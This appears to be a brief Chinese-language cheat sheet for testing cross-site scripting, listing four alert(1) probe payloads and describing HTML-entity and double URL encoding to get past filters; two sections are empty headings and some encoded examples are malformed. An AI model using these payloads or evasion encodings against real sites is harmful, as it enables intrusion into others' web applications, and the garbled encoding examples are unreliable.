## XSS测试语句
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href=javascript:alert(1)>
```

## xss绕过编码方式
### JS编码

### HTML 实体编码
命名实体：以&开始，以分号结束。例如"<" 的HTML实体编码为"&lt\; " 
字符编码：十进制、十六进制ASCII码活Unicode字符编码，样式为"&#数值;",例如"<"可以编成"&＃060;"

### URL编码
这里的U也编码，也是两次URL全编码的结果。如果 alert被过滤，结为%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34。
在使用xss编码测试时，需要考虑HTML渲染的顺序，特别是针对多种编码组合时，要选择合适的编码方式进行测试。

## 使用XSS平台测试xss漏洞

